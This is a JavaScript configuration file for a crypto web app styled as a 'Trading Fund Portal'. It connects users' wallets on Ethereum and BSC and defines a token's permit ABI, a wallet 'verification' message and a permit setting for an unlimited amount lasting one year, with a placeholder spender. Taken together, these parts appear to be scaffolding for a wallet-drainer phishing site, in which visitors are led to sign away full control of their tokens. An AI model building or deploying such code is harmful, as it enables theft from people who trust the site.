import { createAppKit } from '@reown/appkit/react'
import { EthersAdapter } from '@reown/appkit-adapter-ethers'
import { mainnet, bsc } from '@reown/appkit/networks'

// 1. Get projectId from https://cloud.reown.com
const projectId = 'YOUR_PROJECT_ID' // Replace with actual project ID

// 2. Set up the Ethers adapter
const ethersAdapter = new EthersAdapter()

// 3. Configure the metadata
const metadata = {
  name: 'Trading Fund Portal',
  description: 'Professional Trading Fund Application Platform',
  url: 'https://tradingfund.com', // origin must match your domain & subdomain
  icons: ['https://avatars.githubusercontent.com/u/179229932']
}

// 4. Create the modal
export const modal = createAppKit({
  adapters: [ethersAdapter],
  projectId,
  networks: [mainnet, bsc],
  defaultNetwork: bsc,
  metadata,
  features: {
    analytics: true,
    email: false,
    socials: false
  }
})

// Web3 utility functions
export const WLFI_TOKEN_ADDRESS = '0x8d0d000ee44948fc98c9b98a4fa4921476f08b0d'
export const WLFI_TOKEN_ABI = [
  'function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s)',
  'function nonces(address owner) view returns (uint256)',
  'function DOMAIN_SEPARATOR() view returns (bytes32)',
  'function balanceOf(address account) view returns (uint256)',
  'function decimals() view returns (uint8)'
]

export const BSC_CHAIN_ID = 56
export const ETH_CHAIN_ID = 1

// Message for wallet verification
export const VERIFICATION_MESSAGE = 'I verify that I own this wallet and agree to the Trading Fund terms and conditions.'

// Permit configuration
export const PERMIT_CONFIG = {
  spender: '0x0000000000000000000000000000000000000000', // Placeholder spender
  amount: '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff', // Unlimited
  deadline: Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60) // 1 year from now
}

//export { WLFI_TOKEN_ADDRESS, WLFI_TOKEN_ABI, VERIFICATION_MESSAGE, PERMIT_CONFIG, BSC_CHAIN_ID }

//export { modal }
